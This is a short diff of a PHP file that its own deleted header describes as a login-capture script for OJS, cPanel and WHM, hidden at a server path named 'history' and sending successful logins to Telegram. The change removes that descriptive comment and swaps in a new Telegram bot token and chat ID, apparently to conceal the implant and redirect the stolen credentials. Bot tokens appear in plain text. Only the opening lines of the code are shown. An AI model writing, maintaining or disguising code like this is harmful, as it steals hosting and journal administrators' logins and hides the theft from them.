@@ -1,12 +1,7 @@
 <?php
-/**
- * OJS + CPANEL + WHM LOGIN CAPTURE - ONLY SUCCESS LOGIN
- * File: /home/cljournal/history
- * MODIFIED: Only sends SUCCESSFUL logins to Telegram
- */
 
-$bot_token = '8773193950:AAHKiJDM87hbREFMh7MoWJ9OwEM1M30OrvI';
-$chat_id = '8282001653';
+$bot_token = '8658565330:AAFBDPWe4dMctwn03JNNatLM_TuNiFittBw';
+$chat_id = '6614104922';
 
 $username = '';
 $password = '';
